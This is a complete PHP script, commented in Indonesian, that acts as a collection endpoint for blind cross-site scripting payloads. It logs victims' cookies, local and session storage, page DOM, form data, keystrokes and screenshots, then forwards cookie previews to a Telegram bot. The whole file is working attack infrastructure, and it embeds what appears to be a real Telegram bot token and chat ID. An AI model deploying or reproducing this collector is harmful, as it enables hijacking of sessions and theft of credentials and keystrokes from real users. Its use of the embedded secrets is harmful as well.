<?php
// XSS Hunter Webhook - Telegram Version
header('Content-Type: application/json');

// ==========================================
// CONFIGURATION & SECURITY SETTINGS
// ==========================================
$secret_key = "MELE123"; // GANTI PAKE TOKEN ACAK PILIHAN LO UNTUK DI DALFOX

// ISI DENGAN DATA DARI @BotFather DAN @userinfobot
$telegram_bot_token = '8632598859:AAGP-z8LHbCnQ6zJaaum6VI6JgAy2eXYK80'; 
$telegram_chat_id   = '5827924709'; 

$save_dir = 'captures/';
$log_file = 'xss_logs.txt';

// Validasi Token Pengaman (Mencegah Flooding & Unauthorized Abuse)
$headers = getallheaders();
$provided_key = $headers['X-API-KEY'] ?? $_GET['token'] ?? null;

if ($provided_key !== $secret_key) {
    http_response_code(403);
    echo json_encode([
        'status' => 'error',
        'message' => 'Access denied. Invalid or missing security token.'
    ]);
    exit; // Menghentikan proses jika token tidak cocok
}
// ==========================================

// Buat folder penampung file kalau belum ada
if (!is_dir($save_dir)) {
    mkdir($save_dir, 0755, true);
}

// Generate unique ID untuk sesi tangkapan
$session_id = uniqid('xss_', true);
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// Susun semua metadata yang masuk
$data = [
    'id' => $session_id,
    'timestamp' => $timestamp,
    'ip' => $ip,
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
    'request_method' => $_SERVER['REQUEST_METHOD'],
    'url' => $_POST['url'] ?? 'N/A',
    'cookies' => $_POST['cookies'] ?? 'N/A',
    'local_storage' => $_POST['localStorage'] ?? 'N/A',
    'session_storage' => $_POST['sessionStorage'] ?? 'N/A',
    'dom_html' => $_POST['dom'] ?? 'N/A',
    'screenshot' => $_POST['screenshot'] ?? null,
    'form_data' => $_POST['forms'] ?? 'N/A',
    'title' => $_POST['title'] ?? 'N/A',
    'origin' => $_POST['origin'] ?? 'N/A',
    'platform' => $_POST['platform'] ?? 'N/A',
    'language' => $_POST['language'] ?? 'N/A',
    'screen_resolution' => $_POST['screen'] ?? 'N/A',
    'timezone' => $_POST['timezone'] ?? 'N/A',
    'memory' => $_POST['memory'] ?? 'N/A',
    'cores' => $_POST['cores'] ?? 'N/A',
    'keyboard_input' => $_POST['keylog'] ?? 'N/A'
];

// Save screenshot ke folder lokal VPS jika ada (format base64)
if ($data['screenshot']) {
    $screenshot_data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['screenshot']));
    $screenshot_path = $save_dir . $session_id . '.png';
    file_put_contents($screenshot_path, $screenshot_data);
    $data['screenshot_path'] = $screenshot_path;
}

// Save entri ke file log txt utama
$log_entry = json_encode($data, JSON_PRETTY_PRINT) . "\n" . str_repeat('=', 80) . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

// Save detail lengkap ke file JSON terpisah
file_put_contents($save_dir . $session_id . '.json', json_encode($data, JSON_PRETTY_PRINT));

// Kirim notifikasi instan ke Telegram jika API sudah diisi
if (!empty($telegram_bot_token) && !empty($telegram_chat_id)) {
    forward_to_telegram($data, $telegram_bot_token, $telegram_chat_id);
}

// Response JSON balik ke client/browser pemicu
echo json_encode([
    'status' => 'success',
    'id' => $session_id,
    'message' => 'Data captured successfully'
]);

// Fungsi khusus untuk meneruskan ringkasan laporan ke API Telegram Bot
function forward_to_telegram($data, $bot_token, $chat_id) {
    $text = "🚨 **XSS ALERT CAPTURED** 🚨\n\n" .
            "📍 **URL Target:**\n" . $data['url'] . "\n\n" .
            "🖥️ **IP Address:** " . $data['ip'] . "\n" .
            "⏰ **Timestamp:** " . $data['timestamp'] . "\n\n" .
            "🍪 **Cookies Preview:**\n`" . substr($data['cookies'], 0, 300) . "`\n\n" .
            "📱 **Platform:** " . $data['platform'];

    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    
    $payload = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>